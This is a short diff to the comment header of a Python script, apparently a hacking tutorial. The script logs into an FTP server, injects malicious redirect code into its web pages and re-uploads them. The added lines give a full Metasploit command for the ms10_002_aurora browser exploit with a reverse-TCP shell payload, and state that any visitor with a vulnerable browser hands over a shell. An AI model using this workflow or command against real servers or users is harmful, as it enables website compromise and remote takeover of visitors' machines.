@@ -10,6 +10,9 @@
 #               3.搜索默认的网页
 #               4.下载每个被找到的网页，并在其中加入恶意重定向代码
 #               6.将被挂马的网页传回FTP服务器
+# 在Kali下配合 msfcli exploit/windows/browser/ms10_002_aurora LHOST=192.168.175.128 SRVHOST=192.168.175.128 URIPATH=/exploit PAYLOAD=windows/shell/reverse_tcp LPORT=443 E
+# 只要其他主机访问了https://192.168.175.128/exploit，同时浏览器存在漏洞，即可获得目标客户端的shell权限
+#
 # 博客 https://blog.csdn.net/l1028386804
 
 import ftplib
